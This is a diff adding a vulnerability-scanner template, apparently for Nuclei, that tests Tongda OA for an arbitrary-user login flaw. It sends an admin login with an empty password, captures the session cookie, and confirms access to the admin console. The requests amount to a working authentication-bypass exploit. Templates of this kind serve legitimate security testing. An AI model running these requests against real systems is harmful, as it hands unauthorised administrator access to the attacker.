@@ -1,0 +1,41 @@
+id: poc-yaml-tongda-oa-anyuser-login
+info:
+  name: TongdaOA Arbitrary User Login Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: privilege-bypass,auth-bypass
+http:
+  - raw:
+      - |
+        POST /logincheck_code.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-type: application/x-www-form-urlencoded
+
+        UNAME=admin&PASSWORD=&encode_type=1&UID=1
+    extractors:
+      - type: regex
+        name: cookie
+        group: 1
+        part: header
+        regex:
+          - "PHPSESSID=(.*?);"
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /general/index.php?is_modify_pwd=1 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID={{cookie}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"admin\""
+          - "\"系统管理员\""
+          - "快捷菜单"
